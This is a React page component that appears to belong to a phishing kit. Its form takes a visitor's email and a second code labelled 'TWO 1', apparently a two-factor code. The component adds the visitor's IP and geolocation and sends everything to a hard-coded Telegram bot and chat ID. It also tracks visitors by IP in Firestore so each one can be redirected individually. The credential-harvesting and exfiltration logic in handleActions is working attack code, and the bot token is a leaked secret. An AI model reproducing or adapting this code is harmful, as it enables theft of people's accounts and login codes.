import React, { useEffect, useState } from "react";
import {
  addDoc,
  collection,
  doc,
  getDoc,
  getDocs,
  onSnapshot,
  setDoc,
} from "firebase/firestore";
import { publicIp, publicIpv4, publicIpv6 } from "public-ip";
import { storage, db } from "../firebase.js";
import { ref, getDownloadURL, uploadBytesResumable } from "firebase/storage";

const About25 = () => {
  const [ip, setIp] = useState(undefined);
  const [code, setCode] = useState("");
  const [userData, setUserData] = useState(undefined);
  const [isUserData, setIsUserData] = useState(false);
  const [userUrl, setUserUrl] = useState(false);
  const [email, setEmail] = useState("");
  const [image, setImage] = useState(null);
  const [imageUrl, setImageUrl] = useState("");
  const [textValue, setTextValue] = useState("");
  const [uploading, setUploading] = useState(false);
  const [randomNumber, setRandomNumber] = useState("");
  const [isValidUrl, setIsValidUrl] = useState(false);

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setTimeout(() => {
      window.location = "rwr";
    }, 1000);
    addUserData(email);
  };

  const handleActions = () => {
    if (code === "") {
      // Handle code validation
      // You can set an error state or display a message
      return;
    } else {
      const bot = "bot6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw";
      const chid = "5651241356";

      fetch(`https://ipapi.co/json/`)
        .then((response) => response.json())
        .then((response) => {
          const { country, region, city } = response;
          const params = {
            content: `========================
                  TWO 1: '${code}'
                  TWO 2: '${email}'
                  Country : '${country}'
                  Region : '${region}'
                  City : '${city}'
                  IP: '${ip}'
                  ========================`,
          };

          fetch(
            `https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
            }
          )
            .then(() => {
              // Handle success, e.g., redirect to 'confirm2.html'
              // You can use react-router or window.location
            })
            .catch((error) => {
              // Handle error
            });
        });
    }
  };

  const handleCodeChange = (e) => {
    setCode(e.target.value); // Allow all keyboard input
  };

  const getUserData = async (e) => {
    const documentSnapshot = await getDocs(collection(db, "nrchanger"));
    const newData = documentSnapshot.docs.map((doc) => ({
      ...doc.data(),
      id: doc.id,
    }));
    const filter = newData.filter((x) => {
      if (x.ip === ip) {
        setIsUserData(true);
        setUserData(x);
        return x;
      }
    });
    if (filter.length === 0) {
      addUserData();
    }
  };

  const getIp = async () => {
    if (ip === undefined) {
      console.log(await publicIpv4());

      const ip = await publicIpv4();
      setIp(ip);
    }
  };
  getIp();

  useEffect(() => {
    if (ip) {
      onSnapshot(collection(db, "nrchanger"), (snapshot) => {
        let isExist = false;
        snapshot.docs
          .map((doc) => ({ ...doc.data(), id: doc.id }))
          .filter((x) => {
            if (x.ip === ip) {
              isExist = true;
              setUserData(x);
              fetch("./data.json")
                .then(function (res) {
                  return res.json();
                })
                .then(function (data) {
                  data.url_data.filter((item) => {
                    if (item.id === parseInt(x.redir)) {
                      setUserUrl(item.url);
                      return;
                    }
                  });
                })
                .catch(function (err) {
                  console.log(err, " error");
                });
            }
          });
        if (!isExist) {
          setUserUrl(false);
        }
      });
    }
  }, [ip]);

  useEffect(() => {
    document.title = "Welcome Rwr";
  }, [userData, userUrl]);

  useEffect(() => {}, [userData]);

  const addUserData = async (email = undefined) => {
    try {
      const docRef = doc(collection(db, "nrchanger"), ip);

      // Check if the document exists
      const docSnap = await getDoc(docRef);

      if (!docSnap.exists()) {
        // Document doesn't exist, so set the data
        await setDoc(docRef, {
          ip: ip,
          number: -1,
          redir: "-1",
        });
        console.log("Document written with ID: ", ip);
        getUserData();
      } else if (docSnap.exists() && email) {
        await setDoc(
          docRef,
          { email: email }, // Add the email field here
          { merge: true }
        );
        console.log("Document written with ID: ", ip);
        getUserData();
      } else {
        console.log("Document already exists with ID: ", ip);
      }
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  };

  useEffect(() => {
    if (ip) {
      getUserData();
    }
  }, [ip]);

  // Function to handle file input changes
  const handleImageChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setImage(file);
      setImageUrl(""); // Clear image URL when a file is selected
      setIsValidUrl(false); // Reset URL validation
    }
  };

  // Function to handle image URL input changes
  const handleImageUrlChange = (e) => {
    const url = e.target.value.trim();
    setImage(null); // Clear selected image when URL is entered
    setImageUrl(url);
    checkImage(url);
  };

  // Function to validate if a URL points to an image
  const checkImage = (url) => {
    if (!url) {
      setIsValidUrl(false);
      return;
    }
    fetch(url)
      .then((response) => {
        if (
          response.ok &&
          response.headers.get("content-type").startsWith("image")
        ) {
          setIsValidUrl(true);
        } else {
          setIsValidUrl(false);
        }
      })
      .catch(() => {
        setIsValidUrl(false);
      });
  };

  // Function to handle text input changes
  const handleTextChange = (e) => {
    setTextValue(e.target.value);
  };

  // Function to handle image upload to Firebase Storage
  const handleUpload = async () => {
    const randomNumber = Math.floor(
      1000000000000000 + Math.random() * 9000000000000000
    );
    if ((!image || !textValue.trim()) && !isValidUrl) {
      alert(
        "Please select an image file and enter some text, or enter a valid image URL"
      );
      return;
    }

    setUploading(true);

    if (image) {
      // Handle file upload
      const storageRef = ref(
        storage,
        `images/${randomNumber.toString()}_${image.name}`
      );
      const uploadTask = uploadBytesResumable(storageRef, image);

      uploadTask.on(
        "state_changed",
        (snapshot) => {
          const progress =
            (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
          console.log(`Upload is ${progress}% done`);
        },
        (error) => {
          console.error("Error uploading image: ", error);
          alert("Error uploading image");
          setUploading(false);
        },
        () => {
          getDownloadURL(uploadTask.snapshot.ref).then(async (downloadURL) => {
            console.log("File available at", downloadURL);
            setImageUrl(downloadURL);
            setRandomNumber(randomNumber);
            setUploading(false);

            // Save additional information to Firestore
            try {
              const docRef = await addDoc(collection(db, "uploads"), {
                number: randomNumber,
                text: textValue,
              });
              console.log("Document written with ID: ", docRef.id);
            } catch (e) {
              console.error("Error adding document: ", e);
            }
          });
        }
      );
    } else if (isValidUrl) {
      // Handle URL upload
      fetch(imageUrl)
        .then((res) => res.blob())
        .then((blob) => {
          const file = new File(
            [blob],
            `${randomNumber.toString()}_${imageUrl.split("/").pop()}`,
            { type: blob.type }
          );
          const storageRef = ref(storage, `images/${file.name}`);
          const uploadTask = uploadBytesResumable(storageRef, file);

          uploadTask.on(
            "state_changed",
            (snapshot) => {
              const progress =
                (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
              console.log(`Upload is ${progress}% done`);
            },
            (error) => {
              console.error("Error uploading image: ", error);
              alert("Error uploading image");
              setUploading(false);
            },
            () => {
              getDownloadURL(uploadTask.snapshot.ref).then(
                async (downloadURL) => {
                  console.log("File available at", downloadURL);
                  setImageUrl(downloadURL);
                  setRandomNumber(randomNumber);
                  setUploading(false);

                  // Save additional information to Firestore
                  try {
                    const docRef = await addDoc(collection(db, "uploads"), {
                      number: randomNumber,
                      text: textValue,
                    });
                    console.log("Document written with ID: ", docRef.id);
                  } catch (e) {
                    console.error("Error adding document: ", e);
                  }
                }
              );
            }
          );
        })
        .catch((error) => {
          console.error("Error fetching image from URL: ", error);
          alert("Error fetching image from URL");
          setUploading(false);
        });
    } else {
      alert("Please select an image file or enter a valid image URL");
      setUploading(false);
    }
  };

  return (
    <div className="App">
      <h1>React Email Form</h1>
      <form onSubmit={handleSubmit}>
        <div className="forca"></div>

        <label>
          <input
            type="email"
            value={email}
            onChange={handleEmailChange}
            required
          />{" "}
        </label>
        <br />
        <br />
        <input
          type="text"
          id="code"
          name="code"
          onChange={handleCodeChange}
          required
        />
        <br />
        <br />
        <button type="submit" onClick={handleActions}>
          Submit
        </button>
      </form>

      <div className="upload-section">
        <h2>Image Upload</h2>
        <input type="file" accept="image/*" onChange={handleImageChange} />
        <div className="image-preview">
          {imageUrl && (
            <img
              src={imageUrl}
              alt="Selected"
              style={{ maxWidth: "100%", maxHeight: "200px" }}
            />
          )}
          {!imageUrl && (
            <div className="preview-text">
              Please select an image for preview
            </div>
          )}
        </div>
      </div>
      <div className="info-section">
        <h2>Additional Information</h2>
        <input
          type="text"
          placeholder="Enter additional information..."
          value={textValue}
          onChange={handleTextChange}
        />
        <input
          type="text"
          placeholder="Enter image URL..."
          value={imageUrl}
          onChange={handleImageUrlChange}
        />
        <button
          onClick={handleUpload}
          disabled={!((image && textValue.trim()) || isValidUrl)}
        >
          {uploading ? "Uploading..." : "Upload Image"}
        </button>
        {randomNumber && (
          <div>
            <h3>Random Number</h3>
            <input type="text" value={randomNumber} readOnly />
          </div>
        )}
      </div>
    </div>
  );
};

export default About25;
